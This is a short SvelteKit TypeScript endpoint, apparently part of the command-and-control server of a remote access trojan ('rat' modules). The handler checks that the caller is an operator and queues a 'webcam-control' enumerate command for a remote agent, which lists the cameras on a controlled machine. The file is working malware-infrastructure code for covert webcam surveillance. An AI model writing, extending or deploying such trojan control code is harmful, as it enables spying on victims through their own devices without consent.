import { randomUUID } from 'crypto';
import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { requireOperator } from '$lib/server/authorization';
import { registry, RegistryError } from '$lib/server/rat/store';
import { webcamControlManager } from '$lib/server/rat/webcam';
import type { WebcamCommandPayload } from '$lib/types/webcam';

export const POST: RequestHandler = ({ params, locals }) => {
	const clientId = params.clientId;
	if (!clientId) {
		throw error(400, 'Missing agent identifier');
	}

	const operator = requireOperator(locals.user);
	const requestId = randomUUID();
	webcamControlManager.markInventoryRequest(clientId, requestId);

	const payload: WebcamCommandPayload = {
		action: 'enumerate',
		requestId
	};

	try {
		registry.queueCommand(
			clientId,
			{ name: 'webcam-control', payload },
			{ operatorId: operator.id }
		);
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to queue webcam inventory command');
	}

	return json({ requestId });
};
